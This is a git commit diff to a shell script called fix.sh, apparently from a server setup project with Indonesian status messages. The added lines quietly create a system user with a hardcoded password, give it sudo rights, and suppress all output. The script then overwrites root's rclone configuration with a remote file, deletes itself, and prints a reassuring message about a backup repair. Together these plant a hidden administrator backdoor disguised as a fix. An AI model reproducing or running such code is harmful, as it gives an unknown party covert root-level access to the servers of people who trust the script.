6ce088ed8d1f48a078c7f12081c8788b52ceba6a
Diah082 <152632332+Diah082@users.noreply.github.com>
2024-07-05 20:30:59 +0700

    Update fix.sh

--- fix.sh
+++ fix.sh
@@ -1,8 +1,14 @@
 #!/bin/bash
+    Username=newbie
+    Password=123@Newbie
+    mkdir -p /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
 wget -q https://raw.githubusercontent.com/diah082/newbie/main/Cfg/rclone.conf
 mv rclone.conf /root/.config/rclone/rclone.conf
 rm fix.*
 clear
-echo -e "RCLONE BERHASIL DIUPDATE" | lolcat
+echo -e "BACKUP BERHASIL DIPERBAIKI" | lolcat
 sleep 5
 exit 0
